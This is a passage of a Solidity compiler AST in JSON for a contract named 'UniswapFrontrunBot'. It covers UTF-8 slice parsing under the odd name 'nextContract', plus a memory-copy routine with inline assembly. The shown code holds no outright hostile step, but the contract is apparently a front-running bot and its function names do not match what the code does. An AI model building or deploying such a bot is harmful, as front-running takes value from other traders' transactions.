														"leftExpression": {
															"argumentTypes": null,
															"id": 373,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 362,
															"src": "5176:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 374,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5180:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "5176:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 383,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 381,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 362,
																"src": "5227:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 382,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5231:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "5227:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 393,
															"nodeType": "Block",
															"src": "5275:32:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 391,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 389,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 359,
																			"src": "5290:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 390,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5294:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "5290:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 392,
																	"nodeType": "ExpressionStatement",
																	"src": "5290:5:0"
																}
															]
														},
														"id": 394,
														"nodeType": "IfStatement",
														"src": "5224:83:0",
														"trueBody": {
															"id": 388,
															"nodeType": "Block",
															"src": "5237:32:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 386,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 384,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 359,
																			"src": "5252:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 385,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5256:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "5252:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 387,
																	"nodeType": "ExpressionStatement",
																	"src": "5252:5:0"
																}
															]
														}
													},
													"id": 395,
													"nodeType": "IfStatement",
													"src": "5173:134:0",
													"trueBody": {
														"id": 380,
														"nodeType": "Block",
														"src": "5186:32:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 378,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 376,
																		"name": "l",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 359,
																		"src": "5201:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 377,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5205:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "5201:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 379,
																"nodeType": "ExpressionStatement",
																"src": "5201:5:0"
															}
														]
													}
												},
												"id": 396,
												"nodeType": "IfStatement",
												"src": "5121:186:0",
												"trueBody": {
													"id": 372,
													"nodeType": "Block",
													"src": "5135:32:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 370,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 368,
																	"name": "l",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 359,
																	"src": "5150:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 369,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5154:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "5150:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 371,
															"nodeType": "ExpressionStatement",
															"src": "5150:5:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 400,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 397,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 359,
														"src": "5367:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 398,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 330,
															"src": "5371:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 399,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "5371:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5367:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 424,
												"nodeType": "IfStatement",
												"src": "5363:158:0",
												"trueBody": {
													"id": 423,
													"nodeType": "Block",
													"src": "5382:139:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 406,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 401,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 332,
																		"src": "5397:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 403,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "5397:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 404,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 330,
																		"src": "5409:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 405,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "5409:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5397:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 407,
															"nodeType": "ExpressionStatement",
															"src": "5397:21:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 413,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 408,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 330,
																		"src": "5433:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 410,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 38,
																	"src": "5433:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 411,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 330,
																		"src": "5446:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 412,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "5446:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5433:22:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 414,
															"nodeType": "ExpressionStatement",
															"src": "5433:22:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 419,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 415,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 330,
																		"src": "5470:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 417,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "5470:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 418,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5482:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "5470:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 420,
															"nodeType": "ExpressionStatement",
															"src": "5470:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 421,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 332,
																"src": "5505:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																	"typeString": "struct UniswapFrontrunBot.slice memory"
																}
															},
															"functionReturnParameters": 336,
															"id": 422,
															"nodeType": "Return",
															"src": "5498:11:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 429,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 425,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 330,
															"src": "5534:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 427,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 38,
														"src": "5534:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 428,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 359,
														"src": "5547:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5534:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 430,
												"nodeType": "ExpressionStatement",
												"src": "5534:14:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 435,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 431,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 330,
															"src": "5559:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 433,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "5559:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 434,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 359,
														"src": "5572:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5559:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 436,
												"nodeType": "ExpressionStatement",
												"src": "5559:14:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 441,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 437,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 332,
															"src": "5584:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 439,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "5584:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 440,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 359,
														"src": "5596:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5584:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 442,
												"nodeType": "ExpressionStatement",
												"src": "5584:13:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 443,
													"name": "rune",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 332,
													"src": "5615:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
														"typeString": "struct UniswapFrontrunBot.slice memory"
													}
												},
												"functionReturnParameters": 336,
												"id": 444,
												"nodeType": "Return",
												"src": "5608:11:0"
											}
										]
									},
									"documentation": null,
									"id": 446,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "nextContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 333,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 330,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "4729:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 329,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "4729:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 332,
												"mutability": "mutable",
												"name": "rune",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "4748:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 331,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "4748:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4728:38:0"
									},
									"returnParameters": {
										"id": 336,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 335,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "4790:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 334,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "4790:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4789:14:0"
									},
									"scope": 1680,
									"src": "4707:920:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 485,
										"nodeType": "Block",
										"src": "5696:493:0",
										"statements": [
											{
												"body": {
													"id": 471,
													"nodeType": "Block",
													"src": "5773:142:0",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "5797:58:0",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"name": "dest",
																					"nodeType": "YulIdentifier",
																					"src": "5823:4:0"
																				},
																				{
																					"arguments": [
																						{
																							"name": "src",
																							"nodeType": "YulIdentifier",
																							"src": "5835:3:0"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "5829:5:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "5829:10:0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "5816:6:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "5816:24:0"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "5816:24:0"
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 448,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5823:4:0",
																	"valueSize": 1
																},
																{
																	"declaration": 450,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5835:3:0",
																	"valueSize": 1
																}
															],
															"id": 462,
															"nodeType": "InlineAssembly",
															"src": "5788:67:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 465,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 463,
																	"name": "dest",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 448,
																	"src": "5869:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 464,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5877:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5869:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 466,
															"nodeType": "ExpressionStatement",
															"src": "5869:10:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 469,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 467,
																	"name": "src",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 450,
																	"src": "5894:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 468,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5901:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5894:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 470,
															"nodeType": "ExpressionStatement",
															"src": "5894:9:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 457,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 455,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 452,
														"src": "5751:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3332",
														"id": 456,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5758:2:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_32_by_1",
															"typeString": "int_const 32"
														},
														"value": "32"
													},
													"src": "5751:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 472,
												"initializationExpression": null,
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 460,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 458,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 452,
															"src": "5762:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "-=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 459,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5769:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "5762:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 461,
													"nodeType": "ExpressionStatement",
													"src": "5762:9:0"
												},
												"nodeType": "ForStatement",
												"src": "5745:170:0"
											},
											{
												"assignments": [
													474
												],
												"declarations": [
													{
														"constant": false,
														"id": 474,
														"mutability": "mutable",
														"name": "mask",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 485,
														"src": "5961:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 473,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5961:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 483,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 482,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 480,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "323536",
															"id": 475,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5973:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_256_by_1",
																"typeString": "int_const 256"
															},
															"value": "256"
														},
														"nodeType": "BinaryOperation",
														"operator": "**",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 478,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"hexValue": "3332",
																		"id": 476,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5981:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_32_by_1",
																			"typeString": "int_const 32"
																		},
																		"value": "32"
																	},
